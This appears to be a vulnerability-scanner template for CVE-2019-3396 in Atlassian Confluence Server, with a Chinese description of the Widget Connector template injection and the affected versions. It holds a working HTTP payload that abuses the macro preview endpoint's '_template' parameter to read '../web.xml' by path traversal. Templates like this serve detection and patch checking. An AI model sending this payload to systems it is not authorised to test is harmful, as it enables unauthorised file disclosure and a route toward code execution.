id: CVE-2019-3396
info:
  name: Atlassian Confluence Server - Path Traversal
  author:
  - l0ne1y
  description: |-
    Atlassian Confluence macro preview模板注入漏洞
    Atlassian Confluence Server是澳大利亚Atlassian公司的一套专业的企业知识管理与协同软件，也可以用于构建企业WiKi。

    Atlassian Confluence Server中存在安全漏洞。远程攻击者可借助Widget Connector宏利用该漏洞执行代码。以下版本受到影响：Atlassian Confluence Server 6.6.12之前版本，6.7.0版本至6.12.3之前版本，6.13.0版本至6.13.3之前版本，6.14.0版本至6.14.2之前版本。
  severity: critical
requests:
- matchers:
  - type: word
    part: body
    words:
    - <param-name>contextConfigLocation</param-name>
  - type: status
    status:
    - 200
  matchers-condition: and
  path:
  - '{{BaseURL}}/rest/tinymce/1/macro/preview'
  method: POST
  body: '{"contentId":"786458","macro":{"name":"widget","body":"","params":{"url":"https://www.viddler.com/v/test","width":"1000","height":"1000","_template":"../web.xml"}}}'
  headers:
    Content-Type: application/json
    Host: localhost
    Referer: http://localhost
